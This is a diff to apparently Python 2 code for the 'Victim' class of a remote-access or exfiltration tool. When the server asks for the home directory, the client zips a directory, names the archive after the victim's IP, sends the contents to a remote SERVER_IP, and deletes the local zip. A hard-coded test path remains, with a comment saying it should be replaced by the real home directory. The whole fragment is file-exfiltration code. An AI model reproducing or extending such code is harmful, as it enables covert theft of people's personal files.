@@ -56,15 +56,18 @@ class Victim(object):
         # NEED to remove the hard coded directories and replace with home
         print "Server has requested the home directory"
         home = expanduser("~")
-        zipf = zipfile.ZipFile('Python.zip', 'w', zipfile.ZIP_DEFLATED)
+        print "home dir is %s" % str(home)
+        zip_name = str(self.ip) + "home_dir.zip"
+        print "zip_name is %s" % str(zip_name)
+        zipf = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
         zipdir('/Users/MaherSamawi/test_zip', zipf)
         zipf.close()
         print "Sending it over"
-        with open("Python.zip", "r") as f:
+        with open(zip_name, "r") as f:
             data = f.read()
             msg_contents = "D," + str(data)
             Messenger.send_message(SERVER_IP, PORT, msg_contents)
-        os.remove("Python.zip")
+        os.remove(zip_name)
 
     def processing_thread(self):
         # Get a message
